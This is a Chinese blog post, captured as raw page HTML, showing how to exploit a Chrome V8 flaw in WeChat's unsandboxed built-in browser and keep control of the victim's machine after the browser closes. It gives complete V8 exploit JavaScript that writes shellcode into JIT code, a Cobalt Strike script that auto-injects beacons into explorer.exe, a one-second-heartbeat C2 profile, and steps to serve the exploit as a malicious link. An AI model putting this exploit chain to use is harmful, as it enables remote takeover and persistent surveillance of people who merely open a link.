data-pjax-state=""><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/tags/" data-pjax-state=""><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/categories/" data-pjax-state=""><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" data-pjax-state=""><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于微信内置浏览器 达到持久控制</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-18T08:56:00.000Z" title="发表于 2021-04-18 16:56:00" style="display: inline;"> 2 小时前</time><span class="post-meta-separator"> |</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-18T10:59:33.260Z" title="更新于 2021-04-18 18:59:33" style="display: inline;"> 30 分钟前</time></span><span class="post-meta-categories"><span class="post-meta-separator"> |</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="https://ailiqun.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-pjax-state="">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label"> 字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5 分钟</span></span><span class="post-meta-separator"> |</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label"> 评论数:</span><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#post-comment" itemprop="discussionUrl" data-pjax-state=""><span class="valine-comment-count" data-xid="/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/" itemprop="commentCount">0</span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="关于微信内置浏览器-达到持久控制"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6" class="headerlink" title="关于微信内置浏览器 达到持久控制" data-pjax-state=""></a> 关于微信内置浏览器 达到持久控制</h1><h3 id="最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%9C%80%E8%BF%91%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E7%88%86%E5%87%BA%E4%BA%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%A4%84%E9%83%BD%E6%98%AF%E5%B0%B1%E4%B8%8D%E8%B5%98%E8%BF%B0%E4%BA%86%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E4%BA%86%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E8%80%8C%E4%B8%94%E9%BB%98%E8%AE%A4%E6%B2%A1%E5%BC%80%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E" class="headerlink" title="最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞" data-pjax-state=""></a>最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞</h3><h3 id="但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%BD%86%E6%98%AF%E7%88%86%E5%87%BA%E6%9D%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%98%AF%E4%BE%9D%E8%B5%96%E5%9C%A8%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E7%A8%8B%E4%B8%8A%E7%9A%84%EF%BC%8C%E5%AF%B9%E6%96%B9%E7%82%B9%E5%87%BB%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5%E5%90%8E%E5%8F%AF%E6%AD%A3%E5%B8%B8%E4%B8%8A%E7%BA%BF%E5%8F%AF%E6%98%AF%E4%B8%80%E6%97%A6%E5%85%B3%E9%97%AD%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%B1%E4%BC%9A%E5%A4%B1%E5%8E%BB%E6%8E%A7%E5%88%B6%E6%9D%83" class="headerlink" title="但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权" data-pjax-state=""></a>但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权</h3><h2 id="解决上述问题"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E8%A7%A3%E5%86%B3%E4%B8%8A%E8%BF%B0%E9%97%AE%E9%A2%98" class="headerlink" title="解决上述问题" data-pjax-state=""></a>解决上述问题</h2><h3 id="1-加载自定义-malleable-C2配置文件-从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89-malleable-C2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%80%E4%B8%8A%E7%BA%BF%E8%B7%B3%E9%BB%98%E8%AE%A4%E4%B8%BA1%E7%A7%92%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%87%AA%E5%8A%A8%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9F%AD%E6%9A%82%E7%9A%84%E6%97%B6%E9%97%B4%E9%87%8C%E5%B0%BD%E5%BF%AB%E8%BD%AC%E7%A7%BB%E8%BF%9B%E7%A8%8B" class="headerlink" title="1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程" data-pjax-state=""></a>1. 加载自定义 malleable C2 配置文件 从而达到主机一上线跳默认为 1 秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程</h3><h3 id="2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AA-Cobalt-Strike-automigrate%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%92%E4%BB%B6%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%BA%BF%E5%90%8E%E4%BC%9A%E8%AF%9D%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E8%BF%9B%E7%A8%8B%E4%BB%8E%E8%80%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%84%B1%E7%A6%BB%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%9D%9F%E7%BC%9A" class="headerlink" title="2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚" data-pjax-state=""></a>2. 加载一个 Cobalt Strike automigrate 自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚</h3><h2 id="具体操作"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C" class="headerlink" title="具体操作" data-pjax-state=""></a>具体操作</h2><h3 id="1-加载自定义-malleable-C2配置文件"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89-malleable-C2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6" class="headerlink" title="1.加载自定义 malleable C2配置文件" data-pjax-state=""></a>1. 加载自定义 malleable C2 配置文件</h3><pre><code>https://github.com/threatexpress/malleable-c2
+</code></pre>
+<h4 id="在此项目上找到你cs版本对应的配置文件，我这里用的4-0-各版本差别不大"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%9C%A8%E6%AD%A4%E9%A1%B9%E7%9B%AE%E4%B8%8A%E6%89%BE%E5%88%B0%E4%BD%A0cs%E7%89%88%E6%9C%AC%E5%AF%B9%E5%BA%94%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%844-0-%E5%90%84%E7%89%88%E6%9C%AC%E5%B7%AE%E5%88%AB%E4%B8%8D%E5%A4%A7" class="headerlink" title="在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大" data-pjax-state=""></a>在此项目上找到你 cs 版本对应的配置文件，我这里用的 4.0 各版本差别不大</h4><p>我们现在只需要修改心跳的设置为一秒<br><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信3.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信3.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A13.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a><br>也可以用我改好的</p>
+<h4 id="下载地址-：-jquery-c2-4-0-profile"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-%EF%BC%9A-jquery-c2-4-0-profile" class="headerlink" title="下载地址  ： jquery-c2.4.0.profile" data-pjax-state=""></a>下载地址  ： <a href="https://www.ailiqun.xyz/images/jquery-c2.4.0.profile" data-pjax-state="">jquery-c2.4.0.profile</a></h4><h4 id="修改好后丢到服务端"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%BF%AE%E6%94%B9%E5%A5%BD%E5%90%8E%E4%B8%A2%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF" class="headerlink" title="修改好后丢到服务端" data-pjax-state=""></a>修改好后丢到服务端</h4><p>启动 cobaltstrike 时在最后面加上配置文件的名称就好<br><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信2.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信2.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A12.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h4 id="2-加载一个-Cobalt-Strike-automigrate自动迁移进程的插件"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AA-Cobalt-Strike-automigrate%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%92%E4%BB%B6" class="headerlink" title="2.加载一个 Cobalt Strike automigrate自动迁移进程的插件" data-pjax-state=""></a>2. 加载一个 Cobalt Strike automigrate 自动迁移进程的插件</h4><p>插件代码：</p>
+<pre><code>on beacon_initial
+{
+ sub callback
+ {
+  $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+  $listener = "test";
+  if ($2  ismatch $regex)
+  {
+   $pid = matched()[1];
+   $inject_pid = $pid;
+   if (-is64 $1)
+   {
+    $arch = "x64";
+   }
+   else
+   {
+    $arch = "x86";
+   }
+   binject($1, $pid, $listener, $arch);
+  }
+ }
+ if($inject_pid != beacon_info($1,"pid"))
+ {
+  bps($1, &amp;callback);
+ }
+}
+</code></pre>
+<h4 id="复制到本地保存成一个-cna文件使用cobaltstrike加载插件就可"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%A4%8D%E5%88%B6%E5%88%B0%E6%9C%AC%E5%9C%B0%E4%BF%9D%E5%AD%98%E6%88%90%E4%B8%80%E4%B8%AA-cna%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8cobaltstrike%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6%E5%B0%B1%E5%8F%AF" class="headerlink" title="复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可" data-pjax-state=""></a>复制到本地保存成一个.cna 文件使用 cobaltstrike 加载插件就可</h4><p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信1.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信1.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A11.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h2 id="测试："><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%B5%8B%E8%AF%95%EF%BC%9A" class="headerlink" title="测试：" data-pjax-state=""></a>测试：</h2><h3 id="1-准备文件"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%87%86%E5%A4%87%E6%96%87%E4%BB%B6" class="headerlink" title="1.准备文件" data-pjax-state=""></a>1. 准备文件</h3><h4 id="新建一个监听器"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9B%91%E5%90%AC%E5%99%A8" class="headerlink" title="新建一个监听器" data-pjax-state=""></a>新建一个监听器</h4><h6 id="监听器名字一定要设置成test"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E7%9B%91%E5%90%AC%E5%99%A8%E5%90%8D%E5%AD%97%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AE%BE%E7%BD%AE%E6%88%90test" class="headerlink" title="监听器名字一定要设置成test" data-pjax-state=""></a>监听器名字一定要设置成 test</h6><p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/jtq.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/jtq.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/jtq.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h4 id="生成一个shellcode"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshellcode" class="headerlink" title="生成一个shellcode" data-pjax-state=""></a>生成一个 shellcode</h4><p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信5.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信5.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A15.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<p>这里的就是你的 shellcode</p>
+<p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信6.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信6.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A16.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h4 id="替换js代码里的shellcode"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%9B%BF%E6%8D%A2js%E4%BB%A3%E7%A0%81%E9%87%8C%E7%9A%84shellcode" class="headerlink" title="替换js代码里的shellcode" data-pjax-state=""></a>替换 js 代码里的 shellcode</h4><p>js 代码如下：</p>
+<pre><code>ENABLE_LOG = true;
+IN_WORKER = true;
+
+// run calc and hang in a loop
+var shellcode = [];//shellcode替换成自己的 注意是x86的
+
+function print(data) {
+}
+
+
+var not_optimised_out = 0;
+var target_function = (function (value) {
+    if (value == 0xdecaf0) {
+        not_optimised_out += 1;
+    }
+    not_optimised_out += 1;
+    not_optimised_out |= 0xff;
+    not_optimised_out *= 12;
+});
+
+for (var i = 0; i &lt; 0x10000; ++i) {
+    target_function(i);
+}
+
+
+var g_array;
+var tDerivedNCount = 17 * 87481 - 8;
+var tDerivedNDepth = 19 * 19;
+
+function cb(flag) {
+    if (flag == true) {
+        return;
+    }
+    g_array = new Array(0);
+    g_array[0] = 0x1dbabe * 2;
+    return 'c01db33f';
+}
+
+function gc() {
+    for (var i = 0; i &lt; 0x10000; ++i) {
+        new String();
+    }
+}
+
+function oobAccess() {
+    var this_ = this;
+    this.buffer = null;
+    this.buffer_view = null;
+
+    this.page_buffer = null;
+    this.page_view = null;
+
+    this.prevent_opt = [];
+
+    var kSlotOffset = 0x1f;
+    var kBackingStoreOffset = 0xf;
+
+    class LeakArrayBuffer extends ArrayBuffer {
+        constructor() {
+            super(0x1000);
+            this.slot = this;
+        }
+    }
+
+    this.page_buffer = new LeakArrayBuffer();
+    this.page_view = new DataView(this.page_buffer);
+
+    new RegExp({ toString: function () { return 'a' } });
+    cb(true);
+
+    class DerivedBase extends RegExp {
+        constructor() {
+            // var array = null;
+            super(
+                // at this point, the 4-byte allocation for the JSRegExp `this` object
+                // has just happened.
+                {
+                    toString: cb
+                }, 'g'
+                // now the runtime JSRegExp constructor is called, corrupting the
+                // JSArray.
+            );
+
+            // this allocation will now directly follow the FixedArray allocation
+            // made for `this.data`, which is where `array.elements` points to.
+            this_.buffer = new ArrayBuffer(0x80);
+            g_array[8] = this_.page_buffer;
+        }
+    }
+
+    // try{
+    var derived_n = eval(`(function derived_n(i) {
+        if (i == 0) {
+            return DerivedBase;
+        }
+
+        class DerivedN extends derived_n(i-1) {
+            constructor() {
+                super();
+                return;
+                ${"this.a=0;".repeat(tDerivedNCount)}
+            }
+        }
+
+        return DerivedN;
+    })`);
+
+    gc();
+
+
+    new (derived_n(tDerivedNDepth))();
+
+    this.buffer_view = new DataView(this.buffer);
+    this.leakPtr = function (obj) {
+        this.page_buffer.slot = obj;
+        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
+    }
+
+    this.setPtr = function (addr) {
+        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
+    }
+
+    this.read32 = function (addr) {
+        this.setPtr(addr);
+        return this.page_view.getUint32(0, true, ...this.prevent_opt);
+    }
+
+    this.write32 = function (addr, value) {
+        this.setPtr(addr);
+        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
+    }
+
+    this.write8 = function (addr, value) {
+        this.setPtr(addr);
+        this.page_view.setUint8(0, value, ...this.prevent_opt);
+    }
+
+    this.setBytes = function (addr, content) {
+        for (var i = 0; i &lt; content.length; i++) {
+            this.write8(addr + i, content[i]);
+        }
+    }
+    return this;
+}
+
+function trigger() {
+    var oob = oobAccess();
+
+    var func_ptr = oob.leakPtr(target_function);
+    print('[*] target_function at 0x' + func_ptr.toString(16));
+
+    var kCodeInsOffset = 0x1b;
+
+    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
+    print('[*] code_addr at 0x' + code_addr.toString(16));
+
+    oob.setBytes(code_addr, shellcode);
+
+    target_function(0);
+}
+
+try{
+    print("start running");
+    trigger();
+}catch(e){
+    print(e);
+}
+</code></pre>
+<p>将上面生成的 shellcode 替换到此处<br><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信4.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信4.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A14.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h4 id="创建一个html文件调用js"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAhtml%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8js" class="headerlink" title="创建一个html文件调用js" data-pjax-state=""></a>创建一个 html 文件调用 js</h4><pre><code>&lt;script src="test.js"&gt;&lt;/script&gt;  test
+</code></pre>
+<h3 id="2-搭建服务"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1" class="headerlink" title="2.搭建服务" data-pjax-state=""></a>2. 搭建服务</h3><h4 id="随便拿什么搭都可以-我直接用hfs搭建下"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E9%9A%8F%E4%BE%BF%E6%8B%BF%E4%BB%80%E4%B9%88%E6%90%AD%E9%83%BD%E5%8F%AF%E4%BB%A5-%E6%88%91%E7%9B%B4%E6%8E%A5%E7%94%A8hfs%E6%90%AD%E5%BB%BA%E4%B8%8B" class="headerlink" title="随便拿什么搭都可以 我直接用hfs搭建下" data-pjax-state=""></a>随便拿什么搭都可以 我直接用 hfs 搭建下</h4><p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信7.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信7.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A17.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h3 id="测试上线与进程转移效果"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%B5%8B%E8%AF%95%E4%B8%8A%E7%BA%BF%E4%B8%8E%E8%BF%9B%E7%A8%8B%E8%BD%AC%E7%A7%BB%E6%95%88%E6%9E%9C" class="headerlink" title="测试上线与进程转移效果" data-pjax-state=""></a>测试上线与进程转移效果</h3><p>可以看的会上线两个 beacon 基于微信的会话在浏览器关闭后即掉线<br><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信8.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/微信8.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%BE%AE%E4%BF%A18.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
+<h3 id="而转移到explorer-exe的会话依然坚挺！"><a href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E8%80%8C%E8%BD%AC%E7%A7%BB%E5%88%B0explorer-exe%E7%9A%84%E4%BC%9A%E8%AF%9D%E4%BE%9D%E7%84%B6%E5%9D%9A%E6%8C%BA%EF%BC%81" class="headerlink" title="而转移到explorer.exe的会话依然坚挺！" data-pjax-state=""></a>而转移到 explorer.exe 的会话依然坚挺！</h3><p><a href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/上号.webp" data-fancybox="group" data-caption="image" class="fancybox"><img src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/上号.webp" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%B8%8A%E5%8F%B7.webp" alt="image" data-ll-status="loaded" class="entered loaded"></a></p>
